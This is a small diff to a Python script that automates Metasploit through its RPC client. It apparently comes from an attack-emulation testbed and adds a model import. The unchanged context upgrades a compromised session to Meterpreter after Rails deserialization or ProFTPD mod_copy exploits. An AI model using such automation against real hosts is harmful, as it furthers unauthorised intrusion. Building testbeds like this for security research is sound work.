@@ -2,7 +2,7 @@ import time
 import sys
 import os
 from pymetasploit3.msfrpc import MsfRpcClient
-
+from CREMEapplication.models import AttackScenario
 
 def record_timestamp(folder, output_time_file):
     output_time_file = os.path.join(folder, output_time_file)
@@ -55,7 +55,7 @@ def main(argv):
 
     while client.jobs.list:
         time.sleep(1)
-        
+
     if(FS == "rails_secret_deserialization" or FS == "proftpd_modcopy_exec"):
         exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
         exploit['SESSION'] = 1
